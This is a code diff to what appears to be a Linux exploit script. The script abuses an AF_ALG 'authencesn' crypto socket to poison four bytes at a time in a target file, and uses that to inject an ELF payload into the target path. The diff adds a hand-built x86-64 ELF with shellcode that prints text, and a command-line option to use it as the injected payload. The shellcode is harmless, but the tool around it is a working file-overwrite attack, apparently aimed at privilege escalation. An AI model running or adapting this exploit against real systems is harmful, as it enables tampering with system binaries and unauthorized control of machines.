@@ -19,6 +19,57 @@ def load_payload(path):
         return payload_file.read()
 
 
+def build_print_payload(message):
+    encoded = message.encode() + b"\n"
+    shellcode = bytes.fromhex(
+        # mov eax, SYS_write
+        "b801000000"
+        # mov edi, STDOUT_FILENO
+        "bf01000000"
+        # lea rsi, [rip+0x10]
+        "488d35"
+    ) + (0x10).to_bytes(4, "little") + bytes.fromhex(
+        # mov edx, len(message)
+        "ba"
+    ) + len(encoded).to_bytes(4, "little") + bytes.fromhex(
+        # syscall
+        "0f05"
+        # xor edi, edi
+        "31ff"
+        # mov eax, SYS_exit
+        "b83c000000"
+        # syscall
+        "0f05"
+    ) + encoded
+
+    entry_offset = 0x78
+    size = entry_offset + len(shellcode)
+    if size % 4:
+        size += 4 - (size % 4)
+
+    elf = bytearray(size)
+    elf[0:16] = b"\x7fELF\x02\x01\x01" + b"\x00" * 9
+    elf[16:18] = (2).to_bytes(2, "little")       # ET_EXEC
+    elf[18:20] = (0x3E).to_bytes(2, "little")    # x86-64
+    elf[20:24] = (1).to_bytes(4, "little")
+    elf[24:32] = (0x400000 + entry_offset).to_bytes(8, "little")
+    elf[32:40] = (0x40).to_bytes(8, "little")    # e_phoff
+    elf[52:54] = (0x40).to_bytes(2, "little")    # e_ehsize
+    elf[54:56] = (0x38).to_bytes(2, "little")    # e_phentsize
+    elf[56:58] = (1).to_bytes(2, "little")       # e_phnum
+
+    ph = 0x40
+    elf[ph:ph + 4] = (1).to_bytes(4, "little")       # PT_LOAD
+    elf[ph + 4:ph + 8] = (5).to_bytes(4, "little")   # PF_R|PF_X
+    elf[ph + 16:ph + 24] = (0x400000).to_bytes(8, "little")
+    elf[ph + 24:ph + 32] = (0x400000).to_bytes(8, "little")
+    elf[ph + 32:ph + 40] = (size).to_bytes(8, "little")
+    elf[ph + 40:ph + 48] = (size).to_bytes(8, "little")
+    elf[ph + 48:ph + 56] = (0x1000).to_bytes(8, "little")
+    elf[entry_offset:entry_offset + len(shellcode)] = shellcode
+    return bytes(elf)
+
+
 def poison_4_bytes(fd, offset, chunk):
     alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
     alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
@@ -77,17 +128,29 @@ def parse_args(argv):
     )
     parser.add_argument(
         "payload",
+        nargs="?",
         help="ELF payload file to inject",
+    )
+    parser.add_argument(
+        "--payload-text",
+        help="build an in-memory ELF payload that prints this text and exits",
     )
     return parser.parse_args(argv)
 
 
 def main(argv=None):
     args = parse_args(argv or sys.argv[1:])
-    payload = load_payload(args.payload)
+    if args.payload_text is not None:
+        payload = build_print_payload(args.payload_text)
+        payload_description = f"in-memory print payload: {args.payload_text!r}"
+    elif args.payload:
+        payload = load_payload(args.payload)
+        payload_description = f"payload file: {args.payload}"
+    else:
+        raise ValueError("provide a payload file or --payload-text")
 
     print(f"[+] target: {args.target}")
-    print(f"[+] payload file: {args.payload}")
+    print(f"[+] {payload_description}")
     print(f"[+] payload length: {len(payload)} bytes")
 
     poison_path(args.target, payload)
